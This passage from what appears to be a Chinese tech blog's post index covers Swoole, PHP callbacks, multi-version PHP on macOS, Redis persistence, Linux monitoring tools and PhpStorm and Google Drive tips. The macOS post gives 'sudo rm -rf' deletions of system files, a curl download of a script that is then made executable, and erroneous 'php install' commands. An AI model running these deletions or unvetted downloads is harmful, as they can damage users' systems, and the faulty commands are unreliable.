(!$client-&gt;connect(&#39;0.0.0.0&#39;, 9501)) &#123; return json(&quot;connect failed. Error: &#123;$client-&gt;errCode&#125;\\n&quot;); &#125; $data &#x3D; [ &quot;url&quot; &#x3D;&gt; &quot;https:&#x2F;&#x2F;api.paasoo.com&#x2F;json&quot;, &quot;data&quot; &#x3D;&gt; [ &quot;key&quot; &#x3D;&gt; &quot;key&quot;, &quot;secret&quot; &#x3D;&gt; &quot;secret&quot;, &quot;from&quot; &#x3D;&gt; &quot;sms&quot;, &quot;to&quot; &#x3D;&gt; &quot;mobile_phone&quot;, &quot;text&quot; &#x3D;&gt; &quot;test&quot;, ], &quot;type&quot; &#x3D;&gt; &quot;get&quot; ]; $client-&gt;send(json_encode($data)); return json($client-&gt;recv()); &#125;&#125; 参考链接 php使用Swoole来实现实时异步任务队列 基于 swoole 下 异步消息队列 API","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"PHP 的四种设置回调函数的方式","slug":"php-s-four-ways-to-set-callback-functions","date":"2020-11-25T14:18:04.000Z","updated":"2020-11-25T14:19:29.255Z","comments":true,"path":"php-s-four-ways-to-set-callback-functions/","link":"","permalink":"https://www.0x2beace.com/php-s-four-ways-to-set-callback-functions/","excerpt":"最近在学习Swoole，顺手整理一下PHP 中的四种设置回调函数的方式。","text":"最近在学习Swoole，顺手整理一下PHP 中的四种设置回调函数的方式。 匿名函数1234&lt;?php$server-&gt;on(&quot;request&quot;, function($request, $respone)&#123; echo &quot;Http Server&quot;;&#125;); 类静态函数1234567class A&#123; static function onConnect($server, $fd)&#123; echo &quot;UDP Server&quot;; &#125;&#125;$server-&gt;on(&quot;connect&quot;, &quot;A::onConnect&quot;);$server-&gt;on(&quot;conncet&quot;, [&quot;A&quot;, &quot;onConnect&quot;]); 函数12345$server-&gt;on(&quot;connect&quot;, &quot;callBack&quot;);function callBack($server, $fd)&#123; echo &quot;Tcp Server&quot;;&#125; 对象方法12345678910111213141516171819# 情景一Class A&#123; public function __construct()&#123; $this-&gt;server-&gt;on(&quot;open&quot;, [$this, &quot;onOpen&quot;]); &#125; public function onOpen($server, $request)&#123; echo &quot;WebSocket Server&quot;; &#125;&#125;# 情景二Class A&#123; function onOpen($request, $respone)&#123; echo &quot;WebSocket Server&quot;; &#125;&#125;$obj &#x3D; new A();$server-&gt;on(&quot;open&quot;, [$obj, &quot;onOpen&quot;]);","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"如何在 Mac OS 上安装多版本的 PHP","slug":"how-to-install-multiple-versions-of-php-on-mac-os","date":"2020-11-24T15:42:11.000Z","updated":"2020-11-24T15:45:22.053Z","comments":true,"path":"how-to-install-multiple-versions-of-php-on-mac-os/","link":"","permalink":"https://www.0x2beace.com/how-to-install-multiple-versions-of-php-on-mac-os/","excerpt":"很久之前在Mac 上做开发，起初搭建环境时遇到了部分问题，加上Mac 预装的那个PHP 版本，实在是不好用，php-fpm 总是启不动，最后索性决定在本地自己装个多版本，可以随时自由切换。","text":"很久之前在Mac 上做开发，起初搭建环境时遇到了部分问题，加上Mac 预装的那个PHP 版本，实在是不好用，php-fpm 总是启不动，最后索性决定在本地自己装个多版本，可以随时自由切换。 是否需要清除旧版本？ 因为需要在Mac 上安装其他版本，所以预装的那个版本的PHP 的存在就没啥意义了。考虑到本机的其他软件可能会依赖它，为了给以后省些事，最后还是决定将预装的版本给移除掉。 事实证明移除了也没关系。 移除旧版本这里说的旧版本指的是Mac 自带的PHP版本。 123456789101112# &#x2F;private&#x2F;etc&#x2F;$ sudo rm -rfi php-fpm.conf.default php-fpm.conf php.ini.default php-fpm.d&#x2F;# &#x2F;usr&#x2F;bin&#x2F;$ sudo rm -rfi php php-config phpize# &#x2F;usr&#x2F;lib&#x2F;$ sudo rm -rf php&#x2F;# &#x2F;usr&#x2F;sbin&#x2F;$ sudo rm -rf php-fpm# &#x2F;usr&#x2F;share&#x2F;$ sudo rm -rf php# &#x2F;usr&#x2F;share&#x2F;man&#x2F;man1&#x2F;$ sudo rm -rf php-config.1 php.1 phpize.1 执行完上面这些命令就能将旧版本的PHP 彻底的从你的Mac 上移除了。 安装多版本直到2018年3月底，所有PHP 相关的brew 都由 homebrew/php tab 处理，但是已经弃用了，所以现在我们使用homebrew/core包中的可用的内容。这应该是一个更好维护但是不太完整的包。 由于PHP5.6和PHP7.0在 Homebrew 上已被弃用，因为以不被支持，虽然不建议在生产环境中使用，但还是可以在开发环境中使用这些不受支持的版本，可以参考：PHP支持的版本。 请记住，Homebrew 正式支持PHP7.1 到 7.3 ，因此如果要安装 PHP5.6或PHP7.0，则需要执行如下命令： 12345$ brew tap exolnet&#x2F;homebrew-deprecatedUpdating Homebrew...&#x3D;&#x3D;&gt; Auto-updated Homebrew!Updated 1 tap (homebrew&#x2F;core).…… 接下来正式开始安装PHP 的各种版本，并使用简单的脚本来进行版本之间的切换。 12345$ php install php@5.6$ php install php@7.0$ php install php@7.1$ php install php@7.2$ php install php@7.3 第一个安装所花费的时间长一些，因为需要安装一堆brew 的依赖，随后其他版本的安装的将很快。 所安装各版本的PHP都在该目录下： 12345$ ls &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php5.6 7.0 7.1 7.2 7.3# php.ini 配置文件目录&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;x.x&#x2F;php.ini 安装完以上版本的PHP 之后，执行： 12345$ php -v PHP 7.3.5 (cli) (built: May 2 2019 12:40:36) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.3.5, Copyright (c) 1998-2018 Zend Technologies with Zend OPcache v7.3.5, Copyright (c) 1999-2018, by Zend Technologies 可以看到目前所使用的PHP 版本是7.3（最后安装完的那个），现在试图切换到第一个安装的PHP 版本： 1$ brew unlink php@7.3 &amp;&amp; brew link --force --overwrite php@5.6 unlick 安装PHP 版本之间不再需要联系，因为默认情况下他们是没有符号链接。 再次查看当前版本： 12345$ php -vPHP 5.6.40 (cli) (built: Apr 23 2019 11:14:34)Copyright (c) 1997-2016 The PHP GroupZend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies with Zend OPcache v7.0.6-dev, Copyright (c) 1999-2016, by Zend Technologies 切换的挺顺利的，但如果每次需要切换时都需要这样输入就变得很麻烦了，幸运的是，一些勤劳的人已经为我们完成了艰苦的工作，并编写了一个非常方便的脚本——PHP切换器脚本。 将sphp脚本安装到 brew 的标准中/usr/local/bin： 12$ curl -L https:&#x2F;&#x2F;gist.githubusercontent.com&#x2F;rhukster&#x2F;f4c04f1bf59e0b74e335ee5d186a98e2&#x2F;raw &gt; &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sphp$ chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sphp 多版本切换完成这些步骤后，就能够使用脚本命令切换PHP版本： 1$ sphp 7.2 使用时会需要提供管理员密码，相比长长的命令这已经省事很多了。 好了，到这里就顺利的完成了多版本的PHP 安装以及切换。 管理 PHP 服务在不需要切换版本时，使用brew services命令可以对该版本的PHP 进行管理： 启动/停止/重启 PHP服务： 1$ brew services start&#x2F;stop&#x2F;restart php 当PHP 服务启动时，通过查看进程列表，可以发现多了几个名为php-fpm 的进程。 php-fpm的进程所在目录：/usr/local/opt/php/sbin/php-fpm 这个进程很重要，在与 Nginx 交互时，如果没有启动它，通常会收到 502 Bad Gateway 的错误。 启动 php-fpm尽管不需要刻意的去管理这个进程，但如果这个进程意外停止运行了，还是要知道该如何启动它。 前台启动12$ cd &#x2F;usr&#x2F;local&#x2F;opt&#x2F;php&#x2F;sbin&#x2F;$ .&#x2F;php-fpm 用这种方式启动，当使用⌃ C退出时，进程也会跟着退出。 后台启动12# &#x2F;usr&#x2F;local&#x2F;opt&#x2F;php&#x2F;sbin&#x2F;$ .&#x2F;php-fpm &amp; 如果用这种方式启动，就算退出了当前会话，进程会以守护进程的方式运行着。 检查PHP 版本最后再啰嗦两句，如果需要把当前5.6版本切换成7.2，那么需要分别做两件事： 123456# 第一步$ sphp 7.2# 第二步$ brew services stop php@5.6$ brew services start php@7.2 如果只做了这一步，那么你会发现 php -v的版本输出的确是 7.2，但php_info()所打印的结果却还是 5.6。 这是因为机器上安装了多个PHP 版本，当使用php -v命令时，它将显示默认PHP CLI的版本，而该版本可能不是网站所使用的版本。 所以找出用于特定网站的PHP 版本的最可靠方法是使用phpinfo()函数。 参考链接 Mac 下 Nginx、PHP、MySQL 和 PHP-fpm 的安装和配置 如何在Mac 上安装多版本的PHP 如何卸载Mac 预装的PHP 如何检查PHP 版本","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Redis 持久化快速上手","slug":"redis-persistence-quick-start","date":"2020-11-21T11:05:31.000Z","updated":"2020-11-23T12:34:07.708Z","comments":true,"path":"redis-persistence-quick-start/","link":"","permalink":"https://www.0x2beace.com/redis-persistence-quick-start/","excerpt":"什么是持久化？ Redis 所有数据都是存储在内存中的，对于数据的更新将异步的保存在磁盘中，当Redis实例重启时，即可利用之前持久化的文件实现数据恢复。","text":"什么是持久化？ Redis 所有数据都是存储在内存中的，对于数据的更新将异步的保存在磁盘中，当Redis实例重启时，即可利用之前持久化的文件实现数据恢复。 主流数据库的持久化方式： 快照 Mysql dump Redis rdb 日志 Mysql binlog Redis aof RDB什么是RDB？Redis 通过一条命令或者某种方式创建 rdb 文件，该文件是二进制格式，存储在硬盘中。 当需要对Redis 进行恢复时，就可以去加载该文件。数据恢复的程度，取决于 rdb文件（快照）产生的时刻。 三种触发机制Redis 生成 rdb 文件有三种方式，分别是： save bgsave 自动策略 savesave 命令有如下特点： 同步阻塞 文件策略：如果存在旧的rdb 文件，则会替换成新的 复杂度：O（N） bgsavebgsave 命令有如下特点： 异步非阻塞（几乎不会阻塞客户端） 文件策略和复杂度同上。 save 还是 bgsave？ 命令 save bgsave IO类型 同步 异步 是否阻塞 是 否（阻塞发生在fork() 复杂度 O(n) O(n) 优点 不会消耗额外内存 不阻塞客户端 缺点 阻塞客户端 需要fork，消耗内存 在数据量不大的情况下，其实使用save 还是bgsave 并没有什么差异。 它俩都是需要手动执行命令才会触发机制，那么有没有自动的方式呢？答案是有的。 自动策略自动生成策略是根据某个规则来决定是否生成 rdb 文件，这个过程也是一个bgsave 的过程。 默认策略：|seconds|changes||-|-||900|1||300|10||60|10000| 上述配置的意思是：如果在60s 中做了10000 次改变或者在 300s 中做了 10次 改变，或者在900s 中做了 1 次改变，则均会触发bgsave。 配置12345678#save 900 1#save 300 10 #save 60 10000dbfilename dump.rdb &#x2F;&#x2F; rdb 文件名称dir &#x2F;big_disk_path &#x2F;&#x2F; 工作目录stop-writes-on-bgsave-error yes &#x2F;&#x2F; 如果发生错误，停止写入rdbcompression yes &#x2F;&#x2F; 采用压缩格式 rdbchecksum yes &#x2F;&#x2F; 对rdb 文件进行检验 触发机制Redis 当达到以下触发机制时，也会自动创建rdb 文件。 全量复制 debug reload showdown RDB 文件恢复前面已经提到过了，持久化的目的是为了解决内存异常导致的数据丢失问题，如果真的遇到了这样的情况，RDB 文件又是如何实现数据恢复的呢？ 因为开启持久化之后，数据会存储到名为 dump.rdb 的文件中，当 Redis 服务器重启时，检测到 dump.rdb 文件后，就会自动加载进行数据恢复。 AOF在正式介绍什么是AOF 之前，我们先来了解一下RDB 方式现存的问题。 耗时、耗性能 不可控、丢失数据 什么是AOF？与RDB 不同的是，它是通过保存所执行的写命令来实现的，并且保存的数据格式是客户端发送的命令。 三种策略Redis 在执行写命令时，首先写入硬盘的缓冲区，缓冲区会根据以下三种策略去刷新到磁盘中。 always：每次写入都把缓冲区 fsync 到硬盘，性能影响最大，占用磁盘 IO 较高，数据安全性最高。 everysec：每秒把缓冲区 fsync 到硬盘，对性能影响相对较小。 no：由系统决定是否 fsync。 always 还是 everysec 还是 no？ 命令 always everysec no 优点 不丢失数据 每秒一次 fsync 不用管 缺点 IO 开销较大，一般的sata 盘只有几百 TPS 丢一秒数据 不可控 AOF 重写来看这样一种情况： 12345678910127.0.0.1:6379&gt; set name php OK127.0.0.1:6379&gt; set name cOK127.0.0.1:6379&gt; set name pythonOK127.0.0.1:6379&gt; set name jsOK127.0.0.1:6379&gt; get name &quot;js&quot; 虽然set 了很多次，但是name 的值，只受最后一次set 的影响，所以前面那么多次，其实没有必要也保存到AOF 文件中。 满足所设置的条件时，会自动触发 AOF 重写，此时 Redis 会扫描整个实例的数据，重新生成一个 AOF 文件来达到瘦身的效果。 配置12345678910&#x2F;&#x2F; AOFappendonly yes &#x2F;&#x2F; 开启AOF 策略appendfilename &quot;appendonly-$&#123;port&#125;.aof&quot; &#x2F;&#x2F; aof 文件名appendfsync everysec &#x2F;&#x2F; 刷新策略dir &#x2F;big_disk_path &#x2F;&#x2F; 工作目录no-appendfsync-on-write yes &#x2F;&#x2F; AOF 重写时，是否需要做AOF 检测操作&#x2F;&#x2F; AOF 重写auto-aof-rewrite-percentage 100 &#x2F;&#x2F; AOF 文件距离上次文件增长超过多少百分比auto-aof-rewrite-min-size 64mb &#x2F;&#x2F; AOF 文件体积最小多大以上触发 AOF 文件恢复与 RBD 文件不同，因为AOF 文件的数据格式，是由命令组成的，所以客户端直接执行每条命令就可以将数据进行恢复。 RDB 还是AOF？ RDB 和AOF 有各自的优缺点，那么到底该选择哪个呢？ 并没有绝对正确的答案。需要根据实际情况去作取舍，不过通常都是使用混合持久化的方式。 命令 RDB AOF 启动优先级 低 高 体积 小 大 恢复速度 快 慢 数据安全性 丢数据 根据策略决定 级别 重 轻 混合持久化混合持久化是通过 aof-use-rdb-preamble 参数来开启的。它的操作方式是这样的，在写入的时候先把数据以 RDB 的形式写入文件的开头，再将后续的写命令以 AOF 的格式追加到文件中。这样既能保证数据恢复时的速度，同时又能减少数据丢失的风险。 那么混合持久化中是如何来进行数据恢复的呢？在 Redis 重启时，先加载 RDB 的内容，然后再重放增量 AOF 格式命令。这样就避免了 AOF 持久化时的全量加载，从而使加载速率得到大幅提升。 总结RDB持久化 将某一时刻的数据以二进制形式写入到磁盘里，服务重启时检测到对应文件自动加载进行数据恢复。 有手动触发和自动触发两种机制。 AOF持久化 以文件追加的方式写入客户端执行的写命令。 数据恢复时，通过创建伪客户端的方式执行命令，直到恢复完成。 混合持久化 在写入的时候先把数据以 RDB 的形式写入文件的开头，再将后续的写命令以 AOF 的格式追加到文件中。 参考链接 老半天，终于把 redis 持久化搞懂了","categories":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"},{"name":"持久化","slug":"持久化","permalink":"https://www.0x2beace.com/tags/%E6%8C%81%E4%B9%85%E5%8C%96/"}]},{"title":"Linux系统监控命令整理汇总","slug":"summary-of-linux-system-monitoring-commands","date":"2020-11-17T14:55:16.000Z","updated":"2020-11-19T15:03:30.404Z","comments":true,"path":"summary-of-linux-system-monitoring-commands/","link":"","permalink":"https://www.0x2beace.com/summary-of-linux-system-monitoring-commands/","excerpt":"以下命令以Ubuntu 18.04 LTS 系统为准。","text":"以下命令以Ubuntu 18.04 LTS 系统为准。 命令 功能 实例 free 查看内存使用情况，包括物理内存和虚拟内存 free -h 或 free -m vmstat 对系统的整体情况进行统计，包括内核进程、虚拟内存、磁盘、陷阱和 CPU 活动的统计信息 vmstat 2 100 top 实时显示系统中各个进程的资源占用状况及总体状况 top mpstat 实时系统监控工具，它会报告与CPU相关的统计信息 mpstat sar 收集、报告和保存CPU、内存、输入输出端口使用情况 sar -n DEV 3 100 netstat 检验本机各端口的网络连接情况，用于显示与IP、TCP、UDP和ICMP协议相关的统计数据 netstat -a tcpdump 用于捕捉或者过滤网络上指定接口上接收或者传输的TCP/IP包 tcpdump -i eth0 -c 3 iptraf 用来生成包括TCP信息、UDP计数、ICMP和OSPF信息、以太网负载信息、节点状态信息、IP校验和错误等等统计数据 iptraf iostat 收集显示系统存储设备输入和输出状态统计 iostat -x -k 2 100 lsof 查看进程打开的文件的工具，查看监听端口 lsof -i :3000 atop 显示的是各种系统资源（CPU, memory, network, I/O, kernel）的综合，并且在高负载的情况下进行了彩色标注 atop htop 它和top命令十分相似，高级的交互式的实时linux进程监控工具 htop ps 最基本同时也是非常强大的进程查看命令 ps aux glances 监视 CPU，平均负载，内存，网络流量，磁盘 I/O，其他处理器 和 文件系统 空间的利用情况 glances dstat 全能系统信息统计工具，可用于替换vmstat、iostat、netstat、nfsstat和ifstat这些命令的工具 dstat uptime 用于查看服务器运行了多长时间以及有多少个用户登录，快速获知服务器的负荷情况 uptime dmesg 主要用来显示内核信息。使用dmesg可以有效诊断机器硬件故障或者添加硬件出现的问题 dmesg mpstat 用于报告多路CPU主机的每颗CPU活动情况，以及整个主机的CPU情况 mpstat 2 3 nmon 监控CPU、内存、I/O、文件系统及网络资源。对于内存的使用，它可以实时的显示 总/剩余内存、交换空间等信息 nmon mytop 用于监控 mysql 的线程和性能。它能让你实时查看数据库以及正在处理哪些查询 mytop iftop 用来监控网卡的实时流量（可以指定网段）、反向解析IP、显示端口信息等 iftop jnettop 以相同的方式来监测网络流量但比 iftop 更形象。它还支持自定义的文本输出，并能以友好的交互方式来深度分析日志 jnettop ngrep 网络层的 grep。它使用 pcap ，允许通过指定扩展正则表达式或十六进制表达式来匹配数据包 ngrep nmap 可以扫描你服务器开放的端口并且可以检测正在使用哪个操作系统 nmap localhost du 查看Linux系统中某目录的大小 du -sh * fdisk 查看硬盘及分区信息 fdisk -l 内存监控freefree命令可以显示当前系统未使用的和已使用的内存数目，还可以显示被内核使用的内存缓冲区。 语法 1free (选项) 常用选项：-b：以Byte为单位显示内存使用情况；-k：以KB为单位显示内存使用情况；-m：以MB为单位显示内存使用情况；-g：以GB为单位显示内存使用情况;-o：不显示缓冲区调节列；-t：显示内存总和列；-V：显示版本信息。 字段说明： total：内存总数； used：已经使用的内存数，包括 cached 和应用程序实际使用的内存； free：空闲的内存数； shared：当前已经废弃不用； buffers：缓存内存数； cached：缓存内存数。 关系：total = used + free vmstatvmstat命令 的含义为显示虚拟内存状态（“Viryual Memor Statics”），但是它可以报告关于进程、内存、I/O等系统整体运行状态。 语法 1vmstat (选项) (参数) 选项-a：显示活动内页；-f：显示启动后创建的进程总数；-m：显示slab信息；-n：头信息仅显示一次；-s：以表格方式显示事件计数器和内存状态；-d：报告磁盘状态；-p：显示指定的硬盘分区状态；-S：输出信息的单位。 参数 事件间隔：状态信息刷新的时间间隔； 次数：显示报告的次数。 字段说明：Procs（进程） r: 运行和等待CPU时间片的进程数，这个值如果长期大于系统CPU个数，就说明CPU资源不足，可以考虑增加CPU b: 等待资源的进程数，比如正在等待I/O或者内存交换等 Memory（内存） swpd: 使用虚拟内存大小，如果swpd的值不为0，但是SI，SO的值长期为0，这种情况不会影响系统性能。 free: 空闲物理内存大小（以KB为单位）。 buff: 用作缓冲的内存大小。 cache: 用作缓存的内存大小，如果cache的值大的时候，说明cache处的文件数多。如果此时IO中的bi比较小，就说明文件系统效率比较好。 Swap si: 每秒从交换区写到内存的大小，由磁盘调入内存。 so: 每秒写入交换区的内存大小，由内存调入磁盘。 注意：内存够用的时候，这2个值都是0，如果这2个值长期大于0时，系统性能会受到影响，磁盘IO和CPU资源都会被消耗。有些朋友看到空闲内存（free）很少的或接近于0时，就认为内存不够用了，不能光看这一点，还要结合si和so，如果free很少，但是si和so也很少（大多时候是0），那么不用担心，系统性能这时不会受到影响的。 IO（现在的Linux版本块的大小为1kb） bi: 每秒读取的块数 bo: 每秒写入的块数 注意：随机磁盘读写的时候，这2个值较大（如超出1024k)，而且wa值比较大，则表示系统磁盘IO性能瓶颈。 system（系统） in: 每秒中断数，包括时钟中断。 cs: 每秒上下文切换数。 注意：上面2个值越大，会看到由内核消耗的CPU时间会越大。 CPU（以百分比表示）us: 用户进程执行时间百分比(user time)us的值比较高时，说明用户进程消耗的CPU时间多，但是如果长期超50%的使用，那么我们就该考虑优化程序算法或者进行加速。 sy: 内核系统进程执行时间百分比(system time)sy的值高时，说明系统内核消耗的CPU资源多，这并不是良性表现，我们应该检查原因。 id: 空闲时间百分比 wa: IO等待时间百分比wa的值高时，说明IO等待比较严重，这可能由于磁盘大量作随机访问造成，也有可能磁盘出现瓶颈（块操作）。 st：一般不关注，虚拟机占用的时间百分比。 CPU 监控toptop命令 可以实时动态地查看系统的整体运行情况。 语法： 1top (选项) 选项：-b：以批处理模式操作；-c：显示完整的治命令；-d：屏幕刷新间隔时间；-I：忽略失效过程；-s：保密模式；-S：累积模式；-i&lt;时间&gt;：设置间隔时间；-u&lt;用户名&gt;：指定用户名；-p&lt;进程号&gt;：指定进程；-n&lt;次数&gt;：循环显示的次数。 字段说明： top：系统当前时间 up xxx days：系统运行时间 1 users：当前登录用户个数 load average：系统负载。即任务队列的平均长度。三个数值分别为最近1分钟、最近5分钟、最近15分钟的平均负载。——超过N（CPU核数）说明系统满负荷运行。 Tasks total：总进程数 running：正在运行的进程数 sleeping：睡眠的进程数 stopped：停止的进程数 zombie：冻结的进程数 %Cpu(s) us：用户进程消耗的CPU百分比 sy：内核进程消耗的CPU百分比 ni：改变过优先级的进程占用CPU的百分比 id：空闲CPU的百分比 wa：IO等待消耗的CPU百分比 Mem total：物理内存总量 free：空闲物理内存总量 used：已用物理内存总量 buff：用作内核缓存内存总量 Swap total：虚拟内存总量 free：空闲虚拟内存总量 used：已用虚拟内存总量 mpstatmpstat命令 指令主要用于多CPU环境下，它显示各个可用CPU的状态系你想。 语法： 1mpstat (选项) (参数) 选项： 1-P：指定CPU编号。 参数： 间隔时间：每次报告的间隔时间（秒）； 次数：显示报告的次数。 ALL表示显示所有CPUs，也可以指定某个CPU；2表示刷新间隔。 网络监控sarsar命令 是Linux下系统运行状态统计工具，它将指定的操作系统状态计数器显示到标准输出设备。 字段说明： IFACE：网络设备的名称 rxpck/s：每秒钟接收到的包数目 txpck/s：每秒钟发送出去的包数目 rxkB/s：每秒钟接收到的字节数 txkB/s：每秒钟发送出去的字节数 netstatnetstat命令一般用于检验本机各端口的网络连接情况，用于显示与IP、TCP、UDP和ICMP协议相关的统计数据。 常用实例： 123456789netstat -aup # 输出所有UDP连接状况netstat -atp # 输出所有TCP连接状况netstat -s # 显示各个协议的网络统计信息netstat -i # 显示网卡列表netstat -r # 显示路由表信息netstat -l # 只显示监听端口netstat -lt # 只列出所有监听 tcp 端口netstat -lu # 只列出所有监听 udp 端口netstat -lx # 只列出所有监听 UNIX 端口 磁盘监控dfdf命令 用于显示磁盘分区上的可使用的磁盘空间。如果没有文件名被指定，则显示当前所有被挂载的文件系统，默认以 KB 为单位。 语法： 1df (选项) (参数) 选项：-a 全部文件系统列表-h 以方便阅读的方式显示-i 显示inode信息-T 显示文件系统类型-l 只显示本地文件系统-k 以KB为单位-m 以MB为单位 参数： 文件：指定文件系统上的文件。 iostatiostat命令 被用于监视系统输入输出设备和CPU的使用情况。 语法： 1iostat (选项) (参数) 选项：-c：仅显示CPU使用情况；-d：仅显示设备利用率；-k：显示状态以千字节每秒为单位，而不使用块每秒；-m：显示状态以兆字节每秒为单位；-p：仅显示块设备和所有被使用的其他分区的状态；-t：显示每个报告产生时的时间；-V：显示版号并退出；-x：显示扩展状态。 参数： 间隔时间：每次报告的间隔时间（秒）； 次数：显示报告的次数。 字段说明： r/s: 每秒完成的读 I/O 设备次数。 w/s: 每秒完成的写 I/O 设备次数。 rkB/s: 每秒读K字节数.是 rsect/s 的一半,因为每扇区大小为512字节。 wkB/s: 每秒写K字节数.是 wsect/s 的一半。 avgrq-sz: 平均每次设备I/O操作的数据大小 (扇区)。 avgqu-sz: 平均I/O队列长度。 await: 平均每次设备I/O操作的等待时间 (毫秒)。 svctm: 平均每次设备I/O操作的服务时间 (毫秒)。 %util: 一秒中有百分之多少的时间用于 I/O 操作,或者说一秒中有多少时间 I/O 队列是非空的。 iotopiotop命令 是一个用来监视磁盘I/O使用状况的top类工具。 iotop具有与top相似的UI，其中包括PID、用户、I/O、进程等相关信息。Linux下的IO统计工具如iostat，nmon等大多数是只能统计到per设备的读写情况，如果你想知道每个进程是如何使用IO的就比较麻烦，使用iotop命令可以很方便的查看。 语法： 1iotop (选项) 选项：-o：只显示有io操作的进程-b：批量显示，无交互，主要用作记录到文件。-n： NUM：显示NUM次，主要用于非交互式模式。-d SEC：间隔SEC秒显示一次。-p PID：监控的进程pid。-u USER：监控的进程用户。 iotop常用快捷键： 左右箭头：改变排序方式，默认是按IO排序。 r：改变排序顺序。 o：只显示有IO输出的进程。 p：进程/线程的显示方式的切换。 a：显示累积使用量。 q：退出。 进程psps（Process Status，进程状态）命令 用于报告当前系统的进程状态。 ps 的用法非常多，这里仅列举一些常用的： 123456ps -aux | grep &lt;name&gt; # 查看name 进程详细信息ps -p &lt;pid&gt; -L # 显示进程&lt;pid&gt; 的所有线程ps -o lstart &lt;pid&gt; # 显示进程的启动时间ps -f --forest -C &lt;name&gt; # 用树的风格显示进程的层次关系ps -e -o pid,uname,pcpu,pmem,comm,etime # 定制显示的列ps -o lstart &lt;pid&gt; # 显示进程的启动时间 系统监控全能工具glancesglances 是一个用来监视 GNU/Linux 和 FreeBSD 操作系统的 GPL 授权的全能工具。 Glances 会用一下几种颜色来代表状态： 绿色：OK（一切正常） 蓝色：CAREFUL（需要注意） 紫色：WARNING（警告） 红色：CRITICAL（严重）。 阀值可以在配置文件中设置，一般阀值被默认设置为（careful=50、warning=70、critical=90）。 dstatdstat命令 是一个用来替换vmstat、iostat、netstat、nfsstat和ifstat这些命令的工具。 直接使用dstat，默认使用的是-cdngy参数，分别显示cpu、disk、net、page、system信息，默认是1s显示一条信息。 参考链接 Linux系统监控命令整理汇总-掌握CPU,内存,磁盘IO等找出性能瓶颈","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.0x2beace.com/tags/Ubuntu/"}]},{"title":"Mac 下IDEA 无法正常启动","slug":"idea-cannot-start-normally-under-mac","date":"2020-11-15T15:37:34.000Z","updated":"2020-11-18T08:42:47.601Z","comments":true,"path":"idea-cannot-start-normally-under-mac/","link":"","permalink":"https://www.0x2beace.com/idea-cannot-start-normally-under-mac/","excerpt":"前言今天本来打算使用PHPStorm的，但是突然启动不了了，就是双击应用程序之后，电脑没有任何反应。","text":"前言今天本来打算使用PHPStorm的，但是突然启动不了了，就是双击应用程序之后，电脑没有任何反应。 因为使用的PHPStorm是破解的，所以我以为是失效了。就在我一筹莫展准备重装一遍的，突然想起”要不试试通过命令行启动“？ 于是我找到PHPStrom的包文件之后，尝试通过命令行启动，虽然同样失败了，但是命令行输出了一些信息。 正是这些信息，才让我想起来，今天上午在整理文件时，不小心把PHPStorm中依赖的一个文件给删除掉了。 于是，马上找到了那个文件并还原了，之后果然能正常启动了。 解决办法如果你也遇到了类似的情况，那么可以尝试这种方式，或许能帮助你找到问题所在。 找到应用程序 右键显示包文件 依次进入Contents-&gt;MacOS 双击shell脚本 接着无论成功或失败都能输出一些内容，然后利用这些内容去查找问题所在。","categories":[{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/categories/Mac/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Google Drive 如何转存文件？","slug":"how-does-google-drive-transfer-files","date":"2020-11-13T13:55:50.000Z","updated":"2020-11-13T13:57:07.503Z","comments":true,"path":"how-does-google-drive-transfer-files/","link":"","permalink":"https://www.0x2beace.com/how-does-google-drive-transfer-files/","excerpt":"对于初次使用Google Drive（以下简称 GD）的同学来说，可能会有以下几点困惑。","text":"对于初次使用Google Drive（以下简称 GD）的同学来说，可能会有以下几点困惑。 大家常说的转存是什么意思？ 常见的转存方式有哪几种？ 在正式回答上面两个问题之前，先来了解一下GD。 GD 是Google 在2012 年4 月24 日推出的一个在线同步存储服务，类似百度的百度网盘，不过不同之处在于GD 不会限速。普通用户默认的存储空间是15 GB。 用户可以将其他用户分享的文件添加到“我的云端硬盘”，这种方式并不会占用用户的存储空间，这个操作相当于是在“我的云端硬盘”中创建了一个软链接，可以快速访问该文件，而文件所有者则还是分享者，如果原作者删除了，那么你网盘里的也会消失。 所以为了解决上述问题，转存的概念便诞生了，它存在的意义是将其他用户分享的文件保存至自己的云盘，类似百度网盘的“保存到我的网盘”功能。 但有所不同的是，如果分享者没有开放权限，那么其他用户则无权转存。 方式一在需要转存的文件上，点击右键，制作一个拷贝，拷贝的文件位于“我的云端硬盘”中。 第一种方式最简单，适用于小文件，不能对文件夹进行 Copy 操作。 方式二Copy, URL to Google Drive 是一个云端硬盘插件。 在目标文件上点击右键，选择打开方式，关联更多应用。 搜索Copy, URL to Google Drive 进行安装。 安装完成之后，还需要进行Google 账号授权才能进行转存操作。 在需要转存的文件夹上 右键-打开方式-Copy, URL to Google Drive，之后点击 Save, Copy to Google Drive，就可以看见正在转存了，如果文件较大时间会比较久。 方式三在Telegram 